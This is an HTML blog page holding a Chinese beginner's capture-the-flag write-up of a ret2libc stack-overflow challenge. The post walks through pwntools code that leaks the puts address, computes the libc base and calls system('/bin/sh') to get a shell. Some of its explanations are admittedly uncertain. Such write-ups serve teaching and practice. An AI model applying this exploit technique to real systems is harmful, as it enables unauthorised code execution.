@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="ret2libc 题目来源ctfshow pwn 03首先你得知道pwnme函数（也就是关键函数的ebp（64位叫rbp））的位数就比如说这个函数ebp只有九位，但是有一个fgets函数能读取100位字符到 stdin里面肯定存在栈溢出想要查看文件的保护类型，使用checksec + 文件名 命令查看文件保护类型懒得打字了…..emmm，这个暂时看不懂这个叫数据执行保护，就是emmm，好吧我也看不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2023/03/02/%E5%AD%99%E7%AC%91%E5%B7%9D/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ret2libc 题目来源ctfshow pwn 03首先你得知道pwnme函数（也就是关键函数的ebp（64位叫rbp））的位数就比如说这个函数ebp只有九位，但是有一个fgets函数能读取100位字符到 stdin里面肯定存在栈溢出想要查看文件的保护类型，使用checksec + 文件名 命令查看文件保护类型懒得打字了…..emmm，这个暂时看不懂这个叫数据执行保护，就是emmm，好吧我也看不">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_9747bf53cf28428b4eecafc0ca161b81.png">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_8114038905f9ecad27199ea99c0dcc44.png">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_7f32733750c9a0a1a21f289571e07d03.png">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_9e59f8c052ad06d32d35f1a776d2a3a4.png">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_f1fe2e2dae0782f285e9798a3e80f5c2.png">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_b4ce7cdf34abb7d670ac17bce9c3f4c6.png">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_2259b9ad84d7fd225058d76844dd1094.png">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_8ef2fd8902f701e8ba9b6e4beacee815.png">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_30c4ab18ef583ee54c09a0e25afe3985.png">
+<meta property="og:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_00ff025ba519cd6a3052957f6bd1f86c.png">
+<meta property="article:published_time" content="2023-03-02T13:06:56.334Z">
+<meta property="article:modified_time" content="2023-03-02T13:06:56.657Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://huatu.98youxi.com/markdown/work/uploads/upload_9747bf53cf28428b4eecafc0ca161b81.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-孙笑川" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/03/02/%E5%AD%99%E7%AC%91%E5%B7%9D/" class="article-date">
+  <time class="dt-published" datetime="2023-03-02T13:06:56.334Z" itemprop="datePublished">2023-03-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>ret2libc 题目来源ctfshow pwn 03<br>首先你得知道pwnme函数（也就是关键函数的ebp（64位叫rbp））的位数<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_9747bf53cf28428b4eecafc0ca161b81.png"><br>就比如说这个函数ebp只有九位，但是有一个fgets函数能读取100位字符到 stdin里面<br>肯定存在栈溢出<br>想要查看文件的保护类型，使用checksec + 文件名 命令查看文件保护类型<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_8114038905f9ecad27199ea99c0dcc44.png"><br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_7f32733750c9a0a1a21f289571e07d03.png"><br>懒得打字了…..<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_9e59f8c052ad06d32d35f1a776d2a3a4.png"><br>emmm，这个暂时看不懂<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_f1fe2e2dae0782f285e9798a3e80f5c2.png"><br>这个叫数据执行保护，就是emmm，好吧我也看不太懂…<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_b4ce7cdf34abb7d670ac17bce9c3f4c6.png"><br>地址随机化，这个保护是我遇到过的，等会会讲一下怎么写关于他的脚本<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_2259b9ad84d7fd225058d76844dd1094.png"><br>…..看不懂</p>
+<p>下面是脚本解析<br>首先导入 pwn 库<br>from pwn import *<br>再导入 LibSearcher 库<br>from LibSearcher import *<br>这个在pip里面，没有的去下一个，pip install LibSearcher<br>然后就是连接靶机<br>p &#x3D; remote(‘靶机的ip’，端口号)<br>然后把你得到的附件使用elf函数给他处理一下<br>（目的是泄露got表和plt表，从而查询到函数的got表地址）<br>elf &#x3D; ELF(.&#x2F;文件名)（注：”.&#x2F;“是在全局查找该文件，这样方便一点）<br>got &#x3D; elf.got[‘puts’]（任意一个函数都可以，目的是找出got表的函数地址）<br>plt &#x3D; elf.plt[‘puts’]（这是查找plt表地址）<br>main &#x3D; elf.symbols[‘main’] (这个不是在got以及plt表的地址，是在这个文件里面的，具体我也不太了解)<br>然后就是构造payload<br>payload &#x3D; b’a’<em>n (这个n是你自己看的，比如说就拿上面那个例子来说，就是9+4（这是32位，如果64位的话就是9+8）</em>b’a’（这是python3的一个特征，在前面加上一个’b’代表字符化，不然会报错）)+p32(plt)+p32(main)+p32(got) (注意这里顺序不能错了，这里是从plt表到main函数再到got表，如果顺序错了就会爆出错误的地址，但是具体的得看具体的题目，这里这个例子是这样的)<br>然后就是发送到靶机上面<br>p.sendline(payload)<br>p.recvuntill(‘这里填截止的字符’)<br>（注：recvline接受1行数据；recvall接受所有数据；recvlines（n）接受n行数据）<br>一般来讲使用recvuntill更加便捷<br>然后就是解码了<br>puts_addr &#x3D; u32(p.recv(4))(u32就是解码，64位的得是u64)<br>然后就是把解码后的地址打印出来，但是必须得转换成16进制的才行<br>print(hex(puts_addr))(md累死我了)<br>然后如果你的脚本写的没问题的话，应该会给你爆出got表里面的puts函数地址<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_8ef2fd8902f701e8ba9b6e4beacee815.png"><br>然后取最后三位，提取到相应的网址上<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_30c4ab18ef583ee54c09a0e25afe3985.png"><br>把得到的后三位输进去就会得到函数的真实的地址<br>不过有点需要注意（他可能会给多个libc库，这你就得一个一个去尝试了，因为有的libc库不一定是对的）<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_00ff025ba519cd6a3052957f6bd1f86c.png"><br>这里我们看到system函数的地址了，但是我们不能直接引用，因为在服务器里面，所有函数的地址都偏移了<br>我们使用我们算出的函数地址减去搜到的函数地址得到偏移量<br>libcbase &#x3D; puts_addr - 0xaaaaa(这里是搜到的地址)<br>然后在用偏移量加system 和 binsh的地址就是他们在got表里面的真实地址了（ida里面能查看的地址是随机化的）<br>sytem &#x3D; 0xaaaaa + libcbase<br>binsh &#x3D; 0xaaaaa + libcbase<br>接下来构造第二个payload<br>payload2 &#x3D; b’a’*(9+4) + p32(system) + b’a’*4 + p32(binsh)<br>这个b’a’*4….emmm,就是构造system命令的时候应该固定要搞得一个东西吧…..（好吧我也不知道）<br>接下来就是发送啦<br>p.sendline(payload2)<br>然后就是打开终端交互窗口<br>p.interactive()<br>然后到ubantu里面运行脚本应该就好了<br>不出意外的话直接获得root权限可以直接cat flag了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/03/02/%E5%AD%99%E7%AC%91%E5%B7%9D/" data-id="cler4gz5v0000c4mu1xe0ht6k" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/02/21/%E7%8E%8B%E5%A2%83%E6%B3%BD%E7%82%92%E9%A5%AD/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/03/02/%E5%AD%99%E7%AC%91%E5%B7%9D/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/21/%E7%8E%8B%E5%A2%83%E6%B3%BD%E7%82%92%E9%A5%AD/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/20/qiezi/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/20/lbw/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/07/%E4%BC%9E%E5%85%B5%E4%B8%80%E5%8F%B7/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
